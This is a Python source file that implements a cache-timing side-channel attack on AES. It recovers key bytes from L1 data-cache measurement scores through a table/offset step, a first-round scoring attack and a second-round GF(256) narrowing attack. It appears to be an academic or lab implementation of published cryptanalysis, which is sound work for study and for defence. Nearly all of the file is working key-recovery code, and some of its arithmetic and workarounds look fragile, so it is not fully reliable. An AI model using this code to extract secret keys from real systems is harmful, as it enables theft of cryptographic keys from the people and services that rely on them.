# 1Round Attack - Tromer score approach, choosing the lines with the highest average score

# 2Round Attack - Naive approch using threshold to cut all the possible 4keyByte values


from pyfinite import ffield  # To perform GF(256) multiplications


delta = 16                                                              # Max number of table elements in a L1-D cache block
s = [                                                                   # Sbox - 256 
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
        ]


# Table/Offset Attack Varables:

table_elem_dic = {}                                                 # dictionary that links table & element index to the respective L1 line that mapps it


# Round 1 Attack Varables:

hk_score = [[0 for x in range(256)] for y in range(16)]             # Score structure per key byte value
hk_ref = [[0 for x in range(256)] for y in range(16)]               # Number of times a given hk has updated its score
candidate_k = []                                                    # List of candidate key bytes per byte
#h_candidate_k = [[]for y in range(16)]                              # All high <ki> bits of each candidate key
#fh_candidate_k = [0 for x in range(16)]                             # The first high<ki> in the format:XXXX 0000 of each candidate keybyte
first_candidate_k = []

# Round 2 Attack Varables:
F = ffield.FField(8)                                                # Galouis Field(256)
lk = [[x for x in range(65536)] for y in range(4)]                  # Structure containing all the combinations from the 4 equations
lk_list = [[]for y in range(4)]                                     # List of the remaining combinations from lk 
hx = [x for x in range(4)]                                          # Hipotetical index
hk = [0 for x in range(16)]                                         # Hipotetical key
fk = [[] for x in range(16)]                                        # Array of the final keys extracted
line_value_threshold = 50                                           # Auxiliar structure








#implement table/offset attack
def table_offset_attack():


    tab_file = open("side_channel_info/table.out", "r")
    table_scores = [float(i) for i in tab_file]
    tab_file.close()

    table_indices_sorted = sorted(range(len(table_scores)), key=lambda k: table_scores[k])
    top_2 = table_indices_sorted[-2:]
    

    #offset checking (0 or 32bit)
    offset_elements = 0
    if (abs(top_2[0]-top_2[1]) == 1):
        top_2.sort()    
        offset_elements = 8
    print(top_2)

    
    #table element structure:  (table index, element index) : L1 line
    for t in range(4):
        for e in range(256):
            line = (top_2[0] + ((offset_elements + e + 256*t)//delta)) %64
            table_elem_dic[(t,e)] = line


    #print(table_indices_sorted)
    #print(table_scores)
    #print("first| second | offset ")
    #print(first, second, offset_elements)
    #print(table_elem_dic)

    return 0





def round_1_attack():


    l=0
    while(True):
        try:
            p,scores  = read_files(l)
            l+=1
        except IOError:
            break


        for bi, byte in enumerate (hk_score):
            for hki in range(len(byte)):
                hx = p[bi] ^ hki          
                hline = table_elem_dic[(bi%4,hx)]
                new_score = scores[hline]
                hk_score[bi][hki] += new_score

    # stores delta keys with highest score per byte
    # for i in range(len(hk_score)):
    #     candidate_k[i] = sorted(range(len(hk_score[i])), key = lambda sub: hk_score[i][sub])[-delta:] 

    #print(hk_score)

    for item in (hk_score):
        a = []
        for index in range(len(item)):
            if item[index] == max(item):
                a.append(index)
        a.sort()    
        candidate_k.append(a.copy())
        


    # sort candidate and pick the min value of each key
    for item in candidate_k:
        first_candidate_k.append(item[0])
        #print(first_candidate_k)
    
    print(first_candidate_k)



def round_2_attack():

    l=0
    while(True):

        try:
            p,scores  = read_files(l)
            l+=1
        except IOError:
            break
        
        #consider using bytes(x) instead of int
        # this might give strange results for fh_candidates = [0-7 AND 246-255] and offset = 8
        # this is a poor (& probably unique) solution to the problem described above
        for low_hkA in range(0, delta):
            for low_hkB in range(0, delta):
                for low_hkC in range(0, delta):
                    for low_hkD in range(0, delta):
                        hk[0] =  (first_candidate_k[0] + low_hkA) %256
                        hk[1] =  (first_candidate_k[1] + low_hkB) %256
                        hk[2] =  (first_candidate_k[2] + low_hkC) %256
                        hk[3] =  (first_candidate_k[3] + low_hkD) %256
                        hk[4] =  (first_candidate_k[4] + low_hkA) %256
                        hk[5] =  (first_candidate_k[5] + low_hkB) %256
                        hk[6] =  (first_candidate_k[6] + low_hkC) %256
                        hk[7] =  (first_candidate_k[7] + low_hkD) %256
                        hk[8] =  (first_candidate_k[8] + low_hkA) %256
                        hk[9] =  (first_candidate_k[9] + low_hkB) %256
                        hk[10] = (first_candidate_k[10] + low_hkC) %256
                        hk[11] = (first_candidate_k[11] + low_hkD) %256
                        hk[12] = (first_candidate_k[12] + low_hkA) %256
                        hk[13] = (first_candidate_k[13] + low_hkB) %256
                        hk[14] = (first_candidate_k[14] + low_hkC) %256
                        hk[15] = (first_candidate_k[15] + low_hkD) %256


                        hx[0] = s[p[0] ^ hk[0]] ^ s[p[5] ^ hk[5]] ^ F.Multiply(2, s[p[10]^hk[10]]) ^ F.Multiply(3, s[p[15]^hk[15]]) ^ s[hk[15]] ^ first_candidate_k[2]
                        hx[1] = s[p[4] ^ hk[4]] ^ F.Multiply(2,s[p[9] ^ hk[9]]) ^ F.Multiply(3, s[p[14]^hk[14]]) ^ s[p[3]^hk[3]] ^ s[hk[14]] ^ first_candidate_k[1] ^ first_candidate_k[5]
                        hx[2] = F.Multiply(2,s[p[8] ^ hk[8]]) ^ F.Multiply(3,s[p[13] ^ hk[13]]) ^ s[p[2]^hk[2]] ^ s[p[7]^hk[7]] ^ s[hk[13]] ^ first_candidate_k[0] ^ first_candidate_k[4] ^ first_candidate_k[8] ^ 1
                        hx[3] = F.Multiply(3,s[p[12] ^ hk[12]]) ^ s[p[1]^hk[1]] ^ s[p[6]^hk[6]] ^ F.Multiply(2, s[p[11]^hk[11]]) ^ s[hk[12]] ^ first_candidate_k[3] ^ first_candidate_k[7] ^ first_candidate_k[11] ^ first_candidate_k[15]
     
                        comb_index = (low_hkA<<12) + (low_hkB<<8) + (low_hkC<<4) + low_hkD
                        for i in range(0,4):
                            hline = table_elem_dic[((2-i)%4, hx[i])]
                            if (scores[hline] < line_value_threshold):
                                lk[i][comb_index] = -1







    # Pass data from lk to lk_list
    for lk_index, lk_item in enumerate(lk):
        for comb in lk_item:
            if comb != -1:
                lk_list[lk_index].append(comb)

    # Registering discovered key bytes
    for lk_index, lk_item in enumerate(lk_list):
        set_final_key(lk_index,lk_item)

    print(fk)





# Auxiliar functions


# Register the possible keys
def set_final_key(i, lk_item):
    
    for item in lk_item:
        for j in range(0,4):
            key_byte = first_candidate_k[(i*4+j*5) %16] + (item>>((3-j)*4) & 0xf)
            if key_byte not in fk[(i*4+j*5)%16]:
                fk[(i*4+j*5)%16].append(key_byte) 


# Get the content of meas, victim files
def read_files(l):
    
    meas_file = open("side_channel_info/meas#" + str(l) + ".out", "r")

    plaintext_raw = meas_file.readline()
    plaintext_raw = plaintext_raw[:-2]

    plaintext = [int(i) for i in plaintext_raw.split('.')]
    scores = [int(i) for i in meas_file]

    meas_file.close()
    
    return plaintext, scores



# Main Program
table_offset_attack()
round_1_attack()
round_2_attack()